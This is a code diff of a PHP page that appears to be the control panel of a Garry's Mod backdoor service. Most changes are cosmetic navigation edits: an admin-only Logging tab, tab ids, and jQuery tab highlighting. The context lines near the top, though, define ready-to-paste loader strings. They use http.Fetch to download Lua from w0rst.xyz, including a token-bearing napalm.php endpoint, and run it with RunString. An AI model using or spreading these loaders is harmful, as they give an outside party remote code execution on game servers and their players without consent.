@@ -25,21 +25,17 @@ $script = "http.Fetch('https://w0rst.xyz/project/func/load.lua', RunString)";
 $public = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=public&token=$token', RunString)";
 $private = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=private&token=$token', RunString)";
 
-if($Local::IsAdmin()) { 
-    $Logs = "<button class='nav-button' onclick='link(`logs`)'>Logging</button>"; 
-}
-
 ?>
 
 <script src="js/redirect.js"></script>
 <script src="js/snowstorm.js"></script>
 <div class="nav-container"> 
     <div class="navbar">
-        <div class="nav-tab">
-            <button class="nav-button" onclick="link('dashboard')">Home</button>
-            <button class="nav-button" onclick="link('members')">Members</button>
-            <button class="nav-button" onclick="link('servers')">Servers</button>
-            <?php echo($Logs); ?>
+        <div class="nav-tab" id="tabs">
+            <button class="nav-button" onclick="link('dashboard')" id="1">Home</button>
+            <button class="nav-button" onclick="link('members')" id="2">Members</button>
+            <button class="nav-button" onclick="link('servers')" id="3">Servers</button>
+            <?php if($Local::IsAdmin()) { echo("<button class='nav-button' onclick='link(`logs`)' id='4'>Logging</button>"); } ?>
         </div>
         <div class="dropdown-holder">
             <div class="button-drop">
@@ -83,6 +79,21 @@ if($Local::IsAdmin()) {
         $('.button-drop').css("border-radius", "3px");
         $(".dropdown").fadeOut(150); 
     });
+
+    // if page is a nav tab
+    var isvalid = false;
+
+    // the hidden webpage div
+    if($(".webpage")) { isvalid=true; }
+
+    if(isvalid == true) {
+        switch($(".webpage").attr('id')) {
+            case "home": $('#1').css("opacity", "1"); break;
+            case "members": $('#2').css("opacity", "1"); break;
+            case "servers": $('#3').css("opacity", "1"); break;
+            case "logging": $('#4').css("opacity", "1"); break;
+        }
+    }
     
     function script() { 
         $(".hidden1").fadeToggle(250); 
